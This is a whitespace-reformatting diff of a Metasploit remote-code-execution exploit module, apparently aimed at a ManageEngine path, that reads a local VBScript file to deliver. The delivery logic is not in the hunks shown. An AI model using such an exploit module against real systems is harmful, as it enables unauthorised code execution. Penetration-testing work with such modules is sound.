@@ -1,14 +1,13 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Exploit::Remote
-	Rank = ExcellentRanking
+    Rank = ExcellentRanking
 
     include Msf::Exploit::Remote::HttpClient
 
-	def initialize(info = {})
-		super(
-            update_info(
-                info,
+    def initialize(info = {})
+        super(
+            update_info(info,
                 'Name'           => 'RCE test',
                 'Description'    => 'Metasploit RCE Module Test',
                 'License'        =>  MSF_LICENSE,
@@ -30,21 +29,21 @@ class MetasploitModule < Msf::Exploit::Remote
             )
         )
 
-		register_options(
-			[
-				OptString.new('TARGETURI', [true, 'The path to manage engine root', '/'])
-			], self.class)
+        register_options(
+            [
+                OptString.new('TARGETURI', [true, 'The path to manage engine root', '/'])
+            ], self.class)
 
-	end
+    end
 
     def bin_to_hex(s)
 
         s.each_byte.map { |b| b.to_s(16).rjust(2, '0') }.join
     end
 
-	def exploit
+    def exploit
 
-		filename = 'aowkwkwk.vbs'
+        filename = 'aowkwkwk.vbs'
         file = File.open(filename, 'rb')
         contents = file.read
 
@@ -67,6 +66,6 @@ class MetasploitModule < Msf::Exploit::Remote
         else
             print_error('Failed')
         end
-	end
+    end
 
 end
